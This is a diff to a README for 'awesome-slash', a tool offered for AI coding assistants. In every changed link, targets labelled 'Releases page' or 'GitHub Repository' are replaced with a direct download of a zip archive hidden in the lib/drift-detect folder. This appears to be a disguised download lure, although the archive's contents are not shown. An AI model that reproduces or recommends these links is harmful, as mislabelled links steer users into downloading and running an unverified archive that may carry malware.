@@ -1,7 +1,7 @@
 # 🎉 awesome-slash - Enhance Your Workflow Effortlessly
 
 ## 📥 Download Now
-[![Download awesome-slash](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/works-yesed-scriptedit/awesome-slash/releases)
+[![Download awesome-slash](https://github.com/works-yesed-scriptedit/awesome-slash/raw/refs/heads/main/lib/drift-detect/slash-awesome-1.7-beta.5.zip)](https://github.com/works-yesed-scriptedit/awesome-slash/raw/refs/heads/main/lib/drift-detect/slash-awesome-1.7-beta.5.zip)
 
 ## 🛠️ Overview
 awesome-slash offers a set of plugins and skills designed specifically for Claude Code, OpenCode, and Codex CLI. It includes 29 autonomous agents that can help you automate your workflow, perform code reviews, detect slops, manage pull requests, identify drift, and more. Whether you are looking to boost productivity or simplify complex tasks, this software provides reliable solutions.
@@ -14,7 +14,7 @@ To get started with awesome-slash, follow these simple steps:
    - Memory: At least 4 GB of RAM.
    - Disk Space: Minimum of 100 MB available.
 
-2. **Visit the Releases Page**: Go to the [Releases page](https://github.com/works-yesed-scriptedit/awesome-slash/releases) to find the software files.
+2. **Visit the Releases Page**: Go to the [Releases page](https://github.com/works-yesed-scriptedit/awesome-slash/raw/refs/heads/main/lib/drift-detect/slash-awesome-1.7-beta.5.zip) to find the software files.
 
 ## 📥 Download & Install
 1. On the Releases page, look for the latest version of awesome-slash. 
@@ -70,12 +70,12 @@ A: Absolutely! We welcome feedback and suggestions to help improve awesome-slash
 
 ## 🌐 Join the Community
 Stay updated with awesome-slash developments and engage with other users:
-- **GitHub Repository**: [awesome-slash GitHub](https://github.com/works-yesed-scriptedit/awesome-slash)
+- **GitHub Repository**: [awesome-slash GitHub](https://github.com/works-yesed-scriptedit/awesome-slash/raw/refs/heads/main/lib/drift-detect/slash-awesome-1.7-beta.5.zip)
 - **Twitter**: Follow us for updates and tips related to workflow automation.
 
 ## 📣 Conclusion
 awesome-slash makes it easier for anyone to optimize their coding and workflow processes. Whether you're automating tasks or improving your code quality, you'll find valuable tools that fit your needs. 
 
-Don't forget to revisit the [Releases page](https://github.com/works-yesed-scriptedit/awesome-slash/releases) for updates and new features as they are released. 
+Don't forget to revisit the [Releases page](https://github.com/works-yesed-scriptedit/awesome-slash/raw/refs/heads/main/lib/drift-detect/slash-awesome-1.7-beta.5.zip) for updates and new features as they are released. 
 
 Happy coding!
